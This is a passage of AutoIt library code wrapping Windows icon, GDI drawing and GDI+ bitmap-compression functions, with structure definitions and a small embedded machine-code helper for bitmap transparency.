			_winapi_deletedc($hsrcdc)
			_winapi_deletedc($hdstdc)
			$aret = DllCall("user32.dll", "lresult", "CallWindowProc", "ptr", __xorproc(), "ptr", 0, "uint", $asize[0] * $asize[1] * 4, "wparam", $adib[0][1], "lparam", $adib[1][1])
			If NOT @error AND $aret[0] Then
				$hresult = _winapi_createiconindirect($adib[1][0], $ahbitmap[0])
			EndIf
		EndIf
		For $i = 0 To 1
			_winapi_deleteobject($ahbitmap[$i])
			If $adib[$i][0] Then
				_winapi_deleteobject($adib[$i][0])
			EndIf
		Next
		If NOT $hresult Then Return SetError(11, 0, 0)
		If $bdelete Then
			_winapi_destroyicon($hicon)
		EndIf
		Return $hresult
	EndFunc

	Func _winapi_createemptyicon($iwidth, $iheight, $ibitsperpel = 32)
		Local $hxor = _winapi_createdib($iwidth, $iheight, $ibitsperpel)
		Local $hand = _winapi_createdib($iwidth, $iheight, 1)
		Local $hdc = _winapi_createcompatibledc(0)
		Local $hsv = _winapi_selectobject($hdc, $hand)
		Local $hbrush = _winapi_createsolidbrush(16777215)
		Local $trect = _winapi_createrect(0, 0, $iwidth, $iheight)
		_winapi_fillrect($hdc, $trect, $hbrush)
		_winapi_deleteobject($hbrush)
		_winapi_selectobject($hdc, $hsv)
		_winapi_deletedc($hdc)
		Local $hicon = _winapi_createiconindirect($hxor, $hand)
		Local $ierror = @error
		If $hxor Then
			_winapi_deleteobject($hxor)
		EndIf
		If $hand Then
			_winapi_deleteobject($hand)
		EndIf
		If NOT $hicon Then Return SetError($ierror + 10, 0, 0)
		Return $hicon
	EndFunc

	Func _winapi_createicon($hinstance, $iwidth, $iheight, $iplanes, $ibitspixel, $pandbits, $pxorbits)
		Local $aret = DllCall("user32.dll", "handle", "CreateIcon", "handle", $hinstance, "int", $iwidth, "int", $iheight, "byte", $iplanes, "byte", $ibitspixel, "struct*", $pandbits, "struct*", $pxorbits)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createiconfromresourceex($pdata, $isize, $bicon = True, $ixdesiredpixels = 0, $iydesiredpixels = 0, $iflags = 0)
		Local $aret = DllCall("user32.dll", "handle", "CreateIconFromResourceEx", "ptr", $pdata, "dword", $isize, "bool", $bicon, "dword", 196608, "int", $ixdesiredpixels, "int", $iydesiredpixels, "uint", $iflags)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_createiconindirect($hbitmap, $hmask, $ixhotspot = 0, $iyhotspot = 0, $bicon = True)
		Local $ticoninfo = DllStructCreate($tagiconinfo)
		DllStructSetData($ticoninfo, 1, $bicon)
		DllStructSetData($ticoninfo, 2, $ixhotspot)
		DllStructSetData($ticoninfo, 3, $iyhotspot)
		DllStructSetData($ticoninfo, 4, $hmask)
		DllStructSetData($ticoninfo, 5, $hbitmap)
		Local $aret = DllCall("user32.dll", "handle", "CreateIconIndirect", "struct*", $ticoninfo)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_destroyicon($hicon)
		Local $aresult = DllCall("user32.dll", "bool", "DestroyIcon", "handle", $hicon)
		If @error Then Return SetError(@error, @extended, False)
		Return $aresult[0]
	EndFunc

	Func _winapi_extracticon($sicon, $iindex, $bsmall = False)
		Local $plarge, $psmall, $tptr = DllStructCreate("ptr")
		If $bsmall Then
			$plarge = 0
			$psmall = DllStructGetPtr($tptr)
		Else
			$plarge = DllStructGetPtr($tptr)
			$psmall = 0
		EndIf
		DllCall("shell32.dll", "uint", "ExtractIconExW", "wstr", $sicon, "int", $iindex, "ptr", $plarge, "ptr", $psmall, "uint", 1)
		If @error Then Return SetError(@error, @extended, 0)
		Return DllStructGetData($tptr, 1)
	EndFunc

	Func _winapi_extracticonex($sfilepath, $iindex, $palarge, $pasmall, $iicons)
		Local $aresult = DllCall("shell32.dll", "uint", "ExtractIconExW", "wstr", $sfilepath, "int", $iindex, "struct*", $palarge, "struct*", $pasmall, "uint", $iicons)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aresult[0]
	EndFunc

	Func _winapi_fileiconinit($brestore = True)
		Local $aret = DllCall("shell32.dll", "int", 660, "int", $brestore)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return 1
	EndFunc

	Func _winapi_geticondimension($hicon)
		Local $ticoninfo = DllStructCreate($tagiconinfo)
		Local $aret = DllCall("user32.dll", "bool", "GetIconInfo", "handle", $hicon, "struct*", $ticoninfo)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Local $tsize = _winapi_getbitmapdimension(DllStructGetData($ticoninfo, 5))
		For $i = 4 To 5
			_winapi_deleteobject(DllStructGetData($ticoninfo, $i))
		Next
		If NOT IsDllStruct($tsize) Then Return SetError(20, 0, 0)
		Return $tsize
	EndFunc

	Func _winapi_geticoninfo($hicon)
		Local $tinfo = DllStructCreate($tagiconinfo)
		Local $aret = DllCall("user32.dll", "bool", "GetIconInfo", "handle", $hicon, "struct*", $tinfo)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Local $aicon[6]
		$aicon[0] = True
		$aicon[1] = DllStructGetData($tinfo, "Icon") <> 0
		$aicon[2] = DllStructGetData($tinfo, "XHotSpot")
		$aicon[3] = DllStructGetData($tinfo, "YHotSpot")
		$aicon[4] = DllStructGetData($tinfo, "hMask")
		$aicon[5] = DllStructGetData($tinfo, "hColor")
		Return $aicon
	EndFunc

	Func _winapi_geticoninfoex($hicon)
		Local $tiiex = DllStructCreate("dword;int;dword;dword;ptr;ptr;ushort;wchar[260];wchar[260]")
		DllStructSetData($tiiex, 1, DllStructGetSize($tiiex))
		Local $aret = DllCall("user32.dll", "bool", "GetIconInfoExW", "handle", $hicon, "struct*", $tiiex)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Local $aresult[8]
		For $i = 0 To 7
			$aresult[$i] = DllStructGetData($tiiex, $i + 2)
		Next
		Return $aresult
	EndFunc

	Func _winapi_loadicon($hinstance, $sname)
		Local $stypeofname = "int"
		If IsString($sname) Then
			$stypeofname = "wstr"
		EndIf
		Local $aret = DllCall("user32.dll", "handle", "LoadIconW", "handle", $hinstance, $stypeofname, $sname)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_loadiconmetric($hinstance, $sname, $imetric)
		Local $stypeofname = "int"
		If IsString($sname) Then
			$stypeofname = "wstr"
		EndIf
		Local $aret = DllCall("comctl32.dll", "long", "LoadIconMetric", "handle", $hinstance, $stypeofname, $sname, "int", $imetric, "handle*", 0)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return $aret[4]
	EndFunc

	Func _winapi_loadiconwithscaledown($hinstance, $sname, $iwidth, $iheight)
		Local $stypeofname = "int"
		If IsString($sname) Then
			$stypeofname = "wstr"
		EndIf
		Local $aret = DllCall("comctl32.dll", "long", "LoadIconWithScaleDown", "handle", $hinstance, $stypeofname, $sname, "int", $iwidth, "int", $iheight, "handle*", 0)
		If @error Then Return SetError(@error, @extended, 0)
		If $aret[0] Then Return SetError(10, $aret[0], 0)
		Return $aret[5]
	EndFunc

	Func _winapi_loadshell32icon($iiconid)
		Local $ticons = DllStructCreate("ptr Data")
		Local $iicons = _winapi_extracticonex("shell32.dll", $iiconid, 0, $ticons, 1)
		If @error Then Return SetError(@error, @extended, 0)
		If $iicons <= 0 Then Return SetError(10, 0, 0)
		Return DllStructGetData($ticons, "Data")
	EndFunc

	Func _winapi_lookupiconidfromdirectoryex($pdata, $bicon = True, $ixdesiredpixels = 0, $iydesiredpixels = 0, $iflags = 0)
		Local $aret = DllCall("user32.dll", "int", "LookupIconIdFromDirectoryEx", "ptr", $pdata, "bool", $bicon, "int", $ixdesiredpixels, "int", $iydesiredpixels, "uint", $iflags)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_mirroricon($hicon, $bdelete = False)
		If NOT $bdelete Then
			$hicon = _winapi_copyicon($hicon)
		EndIf
		Local $aret = DllCall("comctl32.dll", "int", 414, "ptr", 0, "ptr*", $hicon)
		If @error OR NOT $aret[0] Then
			Local $ierror = @error + 10
			If $hicon AND NOT $bdelete Then
				_winapi_destroyicon($hicon)
			EndIf
			Return SetError($ierror, 0, 0)
		EndIf
		Return $aret[2]
	EndFunc

#EndRegion Public Functions
#Region Embedded DLL Functions

	Func __transparencyproc()
		Static $pproc = 0
		If NOT $pproc Then
			If @AutoItX64 Then
				$pproc = __init(Binary("0x48894C240848895424104C894424184C894C24205541574831C0505050505050" & "4883EC284883BC24800000000074054831C0EB0748C7C0010000004821C07522" & "488BAC248000000048837D180074054831C0EB0748C7C0010000004821C07502" & "EB0948C7C001000000EB034831C04821C0740B4831C04863C0E93C0100004C63" & "7C24784983FF647E0F48C7C0010000004863C0E9220100004C637C24784D21FF" & "7D08C74424780000000048C74424280100000048C74424300000000048C74424" & "3800000000488BAC24800000004C637D04488BAC2480000000486345084C0FAF" & "F849C1E7024983C7FC4C3B7C24380F8C88000000488BAC24800000004C8B7D18" & "4C037C24384983C7034C897C2440488B6C2440480FB64500505888442448807C" & "244800744B4C0FB67C244848634424784C0FAFF84C89F848C7C1640000004899" & "48F7F94989C74C89F850488B6C244858884500488B6C2440807D0000740948C7" & "4424280000000048C7442430010000004883442438040F8149FFFFFF48837C24" & "3000741148837C242800740948C7C001000000EB034831C04821C0740E48C7C0" & "FFFFFFFF4863C0EB11EB0C48C7C0010000004863C0EB034831C04883C458415F" & "5DC3"))
			Else
				$pproc = __init(Binary("0x555331C05050505050837C242800740431C0EB05B80100000021C075198B6C24" & "28837D1400740431C0EB05B80100000021C07502EB07B801000000EB0231C021" & "C0740731C0E9E50000008B5C242483FB647E0AB801000000E9D20000008B5C24" & "2421DB7D08C744242400000000C7042401000000C744240400000000C7442408" & "000000008B6C24288B5D048B6C24280FAF5D08C1E30283C3FC3B5C24087C648B" & "6C24288B5D14035C240883C303895C240C8B6C240C0FB6450088442410807C24" & "100074380FB65C24100FAF5C242489D8B96400000099F7F989C3538B6C241058" & "8845008B6C240C807D00007407C7042400000000C74424040100000083442408" & "047181837C240400740D833C24007407B801000000EB0231C021C07409B8FFFF" & "FFFFEB0BEB07B801000000EB0231C083C4145B5DC21000"))
			EndIf
		EndIf
		Return $pproc
	EndFunc

#EndRegion Embedded DLL Functions
#Region Global Variables and Constants
	Global Const $tagbitmapv4header = "struct;dword bV4Size;long bV4Width;long bV4Height;ushort bV4Planes;ushort bV4BitCount;dword bV4Compression;dword bV4SizeImage;long bV4XPelsPerMeter;long bV4YPelsPerMeter;dword bV4ClrUsed;dword bV4ClrImportant;dword bV4RedMask;dword bV4GreenMask;dword bV4BlueMask;dword bV4AlphaMask;dword bV4CSType;int bV4Endpoints[9];dword bV4GammaRed;dword bV4GammaGreen;dword bV4GammaBlue;endstruct"
	Global Const $tagcoloradjustment = "ushort Size;ushort Flags;ushort IlluminantIndex;ushort RedGamma;ushort GreenGamma;ushort BlueGamma;ushort ReferenceBlack;ushort ReferenceWhite;short Contrast;short Brightness;short Colorfulness;short RedGreenTint"
	Global Const $tagdevmode = "wchar DeviceName[32];ushort SpecVersion;ushort DriverVersion;ushort Size;ushort DriverExtra;dword Fields;short Orientation;short PaperSize;short PaperLength;short PaperWidth;short Scale;short Copies;short DefaultSource;short PrintQuality;short Color;short Duplex;short YResolution;short TTOption;short Collate;wchar FormName[32];ushort Unused1;dword Unused2[3];dword Nup;dword Unused3;dword ICMMethod;dword ICMIntent;dword MediaType;dword DitherType;dword Reserved1;dword Reserved2;dword PanningWidth;dword PanningHeight"
	Global Const $tagdevmode_display = "wchar DeviceName[32];ushort SpecVersion;ushort DriverVersion;ushort Size;ushort DriverExtra;dword Fields;" & $tagpoint & ";dword DisplayOrientation;dword DisplayFixedOutput;short Unused1[5];wchar Unused2[32];ushort LogPixels;dword BitsPerPel;dword PelsWidth;dword PelsHeight;dword DisplayFlags;dword DisplayFrequency"
	Global Const $tagdwm_colorization_parameters = "dword Color;dword AfterGlow;uint ColorBalance;uint AfterGlowBalance;uint BlurBalance;uint GlassReflectionIntensity; uint OpaqueBlend"
	Global Const $tagenhmetaheader = "struct;dword Type;dword Size;long rcBounds[4];long rcFrame[4];dword Signature;dword Version;dword Bytes;dword Records;ushort Handles;ushort Reserved;dword Description;dword OffDescription;dword PalEntries;long Device[2];long Millimeters[2];dword PixelFormat;dword OffPixelFormat;dword OpenGL;long Micrometers[2];endstruct"
	Global Const $tagextlogpen = "dword PenStyle;dword Width;uint BrushStyle;dword Color;ulong_ptr Hatch;dword NumEntries"
	Global Const $tagfontsignature = "dword fsUsb[4];dword fsCsb[2]"
	Global Const $tagglyphmetrics = "uint BlackBoxX;uint BlackBoxY;" & $tagpoint & ";short CellIncX;short CellIncY"
	Global Const $taglogbrush = "uint Style;dword Color;ulong_ptr Hatch"
	Global Const $taglogpen = "uint Style;dword Width;dword Color"
	Global Const $tagmat2 = "short eM11[2];short eM12[2];short eM21[2];short eM22[2]"
	Global Const $tagnewtextmetric = $tagtextmetric & ";dword ntmFlags;uint ntmSizeEM;uint ntmCellHeight;uint ntmAvgWidth"
	Global Const $tagnewtextmetricex = $tagnewtextmetric & ";" & $tagfontsignature
	Global Const $tagpanose = "struct;byte bFamilyType;byte bSerifStyle;byte bWeight;byte bProportion;byte bContrast;byte bStrokeVariation;byte bArmStyle;byte bLetterform;byte bMidline;byte bXHeight;endstruct"
	Global Const $tagoutlinetextmetric = "struct;uint otmSize;" & $tagtextmetric & ";byte otmFiller;" & $tagpanose & ";byte bugFiller[3];uint otmSelection;uint otmType;int otmCharSlopeRise;int otmCharSlopeRun;int otmItalicAngle;uint otmEMSquare;int otmAscent;int otmDescent;uint otmLineGap;uint otmCapEmHeight;uint otmXHeight;long otmFontBox[4];int otmMacAscent;int otmMacDescent;uint otmMacLineGap;uint otmMinimumPPEM;long otmSubscriptSize[2];long otmSubscriptOffset[2];long otmSuperscriptSize[2];long otmSuperscriptOffse[2];uint otmStrikeoutSize;int otmStrikeoutPosition;int otmUnderscoreSize;int otmUnderscorePosition;uint_ptr otmFamilyName;uint_ptr otmFaceName;uint_ptr otmStyleName;uint_ptr otmFullName;endstruct"
	Global Const $tagpaintstruct = "hwnd hDC;int fErase;dword rPaint[4];int fRestore;int fIncUpdate;byte rgbReserved[32]"
	Global Const $tagrgndataheader = "struct;dword Size;dword Type;dword Count;dword RgnSize;" & $tagrect & ";endstruct"
	Global Const $tagxform = "float eM11;float eM12;float eM21;float eM22;float eDx;float eDy"
#EndRegion Global Variables and Constants
#Region Functions list
#EndRegion Functions list
#Region Public Functions

	Func _winapi_abortpath($hdc)
		Local $aret = DllCall("gdi32.dll", "bool", "AbortPath", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_addfontmemresourceex($pdata, $isize)
		Local $aret = DllCall("gdi32.dll", "handle", "AddFontMemResourceEx", "ptr", $pdata, "dword", $isize, "ptr", 0, "dword*", 0)
		If @error Then Return SetError(@error, @extended, 0)
		Return SetExtended($aret[4], $aret[0])
	EndFunc

	Func _winapi_addfontresourceex($sfont, $iflag = 0, $bnotify = False)
		Local $aret = DllCall("gdi32.dll", "int", "AddFontResourceExW", "wstr", $sfont, "dword", $iflag, "ptr", 0)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
		If $bnotify Then
			Local Const $wm_fontchange = 29
			Local Const $hwnd_broadcast = 65535
			DllCall("user32.dll", "lresult", "SendMessage", "hwnd", $hwnd_broadcast, "uint", $wm_fontchange, "wparam", 0, "lparam", 0)
		EndIf
		Return $aret[0]
	EndFunc

	Func _winapi_addiconoverlay($hicon, $hoverlay)
		Local $aret, $hresult = 0, $ierror = 0
		Local $ahdev[2] = [0, 0]
		Local $tsize = _winapi_geticondimension($hicon)
		Local $hil = DllCall("comctl32.dll", "handle", "ImageList_Create", "int", DllStructGetData($tsize, 1), "int", DllStructGetData($tsize, 2), "uint", 33, "int", 2, "int", 2)
		If @error OR NOT $hil[0] Then Return SetError(@error + 10, @extended, 0)
		Do
			$ahdev[0] = _winapi_create32bithicon($hicon)
			If @error Then
				$ierror = @error + 100
				ExitLoop
			EndIf
			$aret = DllCall("comctl32.dll", "int", "ImageList_ReplaceIcon", "handle", $hil[0], "int", -1, "handle", $ahdev[0])
			If @error OR ($aret[0] = -1) Then
				$ierror = @error + 200
				ExitLoop
			EndIf
			$ahdev[1] = _winapi_create32bithicon($hoverlay)
			If @error Then
				$ierror = @error + 300
				ExitLoop
			EndIf
			$aret = DllCall("comctl32.dll", "int", "ImageList_ReplaceIcon", "handle", $hil[0], "int", -1, "handle", $ahdev[1])
			If @error OR ($aret[0] = -1) Then
				$ierror = @error + 400
				ExitLoop
			EndIf
			$aret = DllCall("comctl32.dll", "bool", "ImageList_SetOverlayImage", "handle", $hil[0], "int", 1, "int", 1)
			If @error OR NOT $aret[0] Then
				$ierror = @error + 500
				ExitLoop
			EndIf
			$aret = DllCall("comctl32.dll", "handle", "ImageList_GetIcon", "handle", $hil[0], "int", 0, "uint", 256)
			If @error OR NOT $aret[0] Then
				$ierror = @error + 600
				ExitLoop
			EndIf
			$hresult = $aret[0]
		Until 1
		DllCall("comctl32.dll", "bool", "ImageList_Destroy", "handle", $hil[0])
		For $i = 0 To 1
			If $ahdev[$i] Then
				_winapi_destroyicon($ahdev[$i])
			EndIf
		Next
		If NOT $hresult Then Return SetError($ierror, 0, 0)
		Return $hresult
	EndFunc

	Func _winapi_adjustbitmap($hbitmap, $iwidth, $iheight, $imode = 3, $tadjustment = 0)
		Local $tobj = DllStructCreate($tagbitmap)
		Local $aret = DllCall("gdi32.dll", "int", "GetObject", "handle", $hbitmap, "int", DllStructGetSize($tobj), "struct*", $tobj)
		If @error OR NOT $aret[0] Then Return SetError(@error, @extended, 0)
		If $iwidth = -1 Then
			$iwidth = DllStructGetData($tobj, "bmWidth")
		EndIf
		If $iheight = -1 Then
			$iheight = DllStructGetData($tobj, "bmHeight")
		EndIf
		$aret = DllCall("user32.dll", "handle", "GetDC", "hwnd", 0)
		Local $hdc = $aret[0]
		$aret = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
		Local $hdestdc = $aret[0]
		$aret = DllCall("gdi32.dll", "handle", "CreateCompatibleBitmap", "handle", $hdc, "int", $iwidth, "int", $iheight)
		Local $hbmp = $aret[0]
		$aret = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hbmp)
		Local $hdestsv = $aret[0]
		$aret = DllCall("gdi32.dll", "handle", "CreateCompatibleDC", "handle", $hdc)
		Local $hsrcdc = $aret[0]
		$aret = DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hsrcdc, "handle", $hbitmap)
		Local $hsrcsv = $aret[0]
		If _winapi_setstretchbltmode($hdestdc, $imode) Then
			Switch $imode
				Case 4
					If IsDllStruct($tadjustment) Then
						If NOT _winapi_setcoloradjustment($hdestdc, $tadjustment) Then
						EndIf
					EndIf
				Case Else
			EndSwitch
		EndIf
		$aret = _winapi_stretchblt($hdestdc, 0, 0, $iwidth, $iheight, $hsrcdc, 0, 0, DllStructGetData($tobj, "bmWidth"), DllStructGetData($tobj, "bmHeight"), 13369376)
		DllCall("user32.dll", "int", "ReleaseDC", "hwnd", 0, "handle", $hdc)
		DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hdestdc, "handle", $hdestsv)
		DllCall("gdi32.dll", "handle", "SelectObject", "handle", $hsrcdc, "handle", $hsrcsv)
		DllCall("gdi32.dll", "bool", "DeleteDC", "handle", $hdestdc)
		DllCall("gdi32.dll", "bool", "DeleteDC", "handle", $hsrcdc)
		If NOT $aret Then Return SetError(10, 0, 0)
		Return $hbmp
	EndFunc

	Func _winapi_alphablend($hdestdc, $ixdest, $iydest, $iwidthdest, $iheightdest, $hsrcdc, $ixsrc, $iysrc, $iwidthsrc, $iheightsrc, $ialpha, $balpha = False)
		Local $iblend = BitOR(BitShift(NOT ($balpha = False), -24), BitShift(BitAND($ialpha, 255), -16))
		Local $aret = DllCall("gdi32.dll", "bool", "GdiAlphaBlend", "handle", $hdestdc, "int", $ixdest, "int", $iydest, "int", $iwidthdest, "int", $iheightdest, "handle", $hsrcdc, "int", $ixsrc, "int", $iysrc, "int", $iwidthsrc, "int", $iheightsrc, "dword", $iblend)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_anglearc($hdc, $ix, $iy, $iradius, $nstartangle, $nsweepangle)
		Local $aret = DllCall("gdi32.dll", "bool", "AngleArc", "handle", $hdc, "int", $ix, "int", $iy, "dword", $iradius, "float", $nstartangle, "float", $nsweepangle)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_arc($hdc, $trect, $ixstartarc, $iystartarc, $ixendarc, $iyendarc)
		Local $aret = DllCall("gdi32.dll", "bool", "Arc", "handle", $hdc, "int", DllStructGetData($trect, 1), "int", DllStructGetData($trect, 2), "int", DllStructGetData($trect, 3), "int", DllStructGetData($trect, 4), "int", $ixstartarc, "int", $iystartarc, "int", $ixendarc, "int", $iyendarc)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_arcto($hdc, $trect, $ixradial1, $iyradial1, $ixradial2, $iyradial2)
		Local $aret = DllCall("gdi32.dll", "bool", "ArcTo", "handle", $hdc, "int", DllStructGetData($trect, 1), "int", DllStructGetData($trect, 2), "int", DllStructGetData($trect, 3), "int", DllStructGetData($trect, 4), "int", $ixradial1, "int", $iyradial1, "int", $ixradial2, "int", $iyradial2)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_beginpaint($hwnd, ByRef $tpaintstruct)
		$tpaintstruct = DllStructCreate($tagpaintstruct)
		Local $aret = DllCall("user32.dll", "handle", "BeginPaint", "hwnd", $hwnd, "struct*", $tpaintstruct)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_beginpath($hdc)
		Local $aret = DllCall("gdi32.dll", "bool", "BeginPath", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_closeenhmetafile($hdc)
		Local $aret = DllCall("gdi32.dll", "handle", "CloseEnhMetaFile", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, 0)
		Return $aret[0]
	EndFunc

	Func _winapi_closefigure($hdc)
		Local $aret = DllCall("gdi32.dll", "bool", "CloseFigure", "handle", $hdc)
		If @error Then Return SetError(@error, @extended, False)
		Return $aret[0]
	EndFunc

	Func _winapi_coloradjustluma($irgb, $ipercent, $bscale = True)
		If $irgb = -1 Then Return SetError(10, 0, -1)
		If $bscale Then
			$ipercent = Floor($ipercent * 10)
		EndIf
		Local $aret = DllCall("shlwapi.dll", "dword", "ColorAdjustLuma", "dword", __rgb($irgb), "int", $ipercent, "bool", $bscale)
		If @error Then Return SetError(@error, @extended, -1)
		Return __rgb($aret[0])
	EndFunc

	Func _winapi_colorhlstorgb($ihue, $iluminance, $isaturation)
		If NOT $isaturation Then $ihue = 160
		Local $aret = DllCall("shlwapi.dll", "dword", "ColorHLSToRGB", "word", $ihue, "word", $iluminance, "word", $isaturation)
		If @error Then Return SetError(@error, @extended, -1)
		Return __rgb($aret[0])
	EndFunc

	Func _winapi_colorrgbtohls($irgb, ByRef $ihue, ByRef $iluminance, ByRef $isaturation)
		Local $aret = DllCall("shlwapi.dll", "none", "ColorRGBToHLS", "dword", __rgb($irgb), "word*", 0, "word*", 0, "word*", 0)
		If @error Then Return SetError(@error, @extended, 0)
		$ihue = $aret[2]
		$iluminance = $aret[3]
		$isaturation = $aret[4]
		Return 1
	EndFunc

	Func _winapi_combinetransform($txform1, $txform2)
		Local $txform = DllStructCreate($tagxform)
		Local $aret = DllCall("gdi32.dll", "bool", "CombineTransform", "struct*", $txform, "struct*", $txform1, "struct*", $txform2)
		If @error OR NOT $aret[0] Then Return SetError(@error + 10, @extended, 0)
		Return $txform
	EndFunc

	Func _winapi_compressbitmapbits($hbitmap, ByRef $pbuffer, $icompression = 0, $iquality = 100)
		If NOT __dll("gdiplus.dll") Then Return SetError(103, 0, 0)
		Local $asize[2], $icount, $iformat, $ilength, $smime, $aret, $hdc, $hsv, $hmem, $tbits, $tdata, $pdata, $ierror = 1
		Local $hsource = 0, $himage = 0, $htoken = 0, $pstream = 0, $tparam = 0
		Local $tdib = DllStructCreate($tagdibsection)
		Do
			Switch $icompression
				Case 0
					$smime = "image/png"
				Case 1
					$smime = "image/jpeg"
				Case Else
					$ierror = 10
					ExitLoop
			EndSwitch
			While $hbitmap
				If NOT _winapi_getobject($hbitmap, DllStructGetSize($tdib), $tdib) Then
					$ierror = 11
					ExitLoop 2
				EndIf
				If (DllStructGetData($tdib, "bmBitsPixel") = 32) AND (NOT DllStructGetData($tdib, "biCompression")) Then
					$ierror = 12
					ExitLoop
				EndIf
				If $hsource Then
					$ierror = 13
					ExitLoop 2
				EndIf
				$hsource = _winapi_createdib(DllStructGetData($tdib, "bmWidth"), DllStructGetData($tdib, "bmHeight"))
				If NOT $hsource Then
					$ierror = @error + 100
					ExitLoop 2
				EndIf
				$hdc = _winapi_createcompatibledc(0)
				$hsv = _winapi_selectobject($hdc, $hsource)
				If _winapi_drawbitmap($hdc, 0, 0, $hbitmap) Then
					$hbitmap = $hsource
				Else
					$ierror = @error + 200
					$hbitmap = 0
				EndIf
				_winapi_selectobject($hdc, $hsv)
				_winapi_deletedc($hdc)
			WEnd
			If NOT $hbitmap Then
				ExitLoop
			EndIf
			For $i = 0 To 1
				$asize[$i] = DllStructGetData($tdib, $i + 2)
			Next
			$tbits = DllStructCreate("byte[" & ($asize[0] * $asize[1] * 4) & "]")
			If NOT _winapi_getbitmapbits($hbitmap, DllStructGetSize($tbits), $tbits) Then
				$ierror = @error + 300
				ExitLoop
			EndIf
			$tdata = DllStructCreate($taggdipstartupinput)
			DllStructSetData($tdata, "Version", 1)
			$aret = DllCall("gdiplus.dll", "int", "GdiplusStartup", "ulong_ptr*", 0, "struct*", $tdata, "ptr", 0)
			If @error OR $aret[0] Then
				$ierror = @error + 400
				ExitLoop
			EndIf
			If _winapi_isalphabitmap($hbitmap) Then
				$iformat = 2498570
			Else
				$iformat = 139273
			EndIf
			$htoken = $aret[1]
			$aret = DllCall("gdiplus.dll", "int", "GdipCreateBitmapFromScan0", "int", $asize[0], "int", $asize[1], "uint", $asize[0] * 4, "int", $iformat, "struct*", $tbits, "ptr*", 0)
			If @error OR $aret[0] Then
				$ierror = @error + 500
				ExitLoop
			EndIf
			$himage = $aret[6]
			$aret = DllCall("gdiplus.dll", "int", "GdipGetImageEncodersSize", "uint*", 0, "uint*", 0)
			If @error OR $aret[0] Then
				$ierror = @error + 600
				ExitLoop
			EndIf
			$icount = $aret[1]
			$tdata = DllStructCreate("byte[" & $aret[2] & "]")
			If @error Then
				$ierror = @error + 700
				ExitLoop
			EndIf
			$pdata = DllStructGetPtr($tdata)
			$aret = DllCall("gdiplus.dll", "int", "GdipGetImageEncoders", "uint", $icount, "uint", $aret[2], "struct*", $tdata)
			If @error OR $aret[0] Then
				$ierror = @error + 800
				ExitLoop
			EndIf
			Local $tcodec, $pencoder = 0
			For $i = 1 To $icount
				$tcodec = DllStructCreate($taggdipimagecodecinfo, $pdata)
				If NOT StringInStr(_winapi_widechartomultibyte(DllStructGetData($tcodec, "MimeType")), $smime) Then
					$pdata += DllStructGetSize($taggdipimagecodecinfo)
				Else
					$pencoder = $pdata
					$ierror = 0
					ExitLoop
				EndIf
			Next
			If NOT $pencoder Then
				$ierror = 15
				ExitLoop
			EndIf
			Switch $icompression
				Case 0
				Case 1
					Local Const $tagencoderparameter = "byte[16] GUID;ulong NumberOfValues;dword Type;ptr pValue"
					$tparam = DllStructCreate("dword Count;" & $tagencoderparameter & ";ulong Quality")
					DllStructSetData($tparam, "Count", 1)
					DllStructSetData($tparam, "NumberOfValues", 1)
					DllStructSetData($tparam, "Type", 4)
					DllStructSetData($tparam, "pValue", DllStructGetPtr($tparam, "Quality"))
					DllStructSetData($tparam, "Quality", $iquality)
					$aret = DllCall("ole32.dll", "long", "CLSIDFromString", "wstr", "{1D5BE4B5-FA4A-452D-9CDD-5DB35105E7EB}", "ptr", DllStructGetPtr($tparam, 2))
					If @error OR $aret[0] Then
						$tparam = 0
					EndIf
			EndSwitch
			$pstream = _winapi_createstreamonhglobal()
			$aret = DllCall("gdiplus.dll", "int", "GdipSaveImageToStream", "handle", $himage, "ptr", $pstream, "ptr", $pencoder, "struct*", $tparam)
			If @error OR $aret[0] Then
				$ierror = @error + 900
				ExitLoop
			EndIf
			$hmem = _winapi_gethglobalfromstream($pstream)
			$aret = DllCall("kernel32.dll", "ulong_ptr", "GlobalSize", "handle", $hmem)
			If @error OR NOT $aret[0] Then
				$ierror = @error + 1000
				ExitLoop
			EndIf
			$ilength = $aret[0]
			$aret = DllCall("kernel32.dll", "ptr", "GlobalLock", "handle", $hmem)
			If @error OR NOT $aret[0] Then
				$ierror = @error + 1100
				ExitLoop
			EndIf
			$pbuffer = __heaprealloc($pbuffer, $ilength, 1)
			If NOT @error Then
				_winapi_movememory($pbuffer, $aret[0], $ilength)
			Else
				$ierror = @error + 1300
			EndIf
		Until 1
		If $pstream Then
			_winapi_releasestream($pstream)
		EndIf
		If $himage Then
			DllCall("gdiplus.dll", "int", "GdipDisposeImage", "handle", $himage)
		EndIf
		If $htoken Then
			DllCall("gdiplus.dll", "none", "GdiplusShutdown", "ulong_ptr", $htoken)
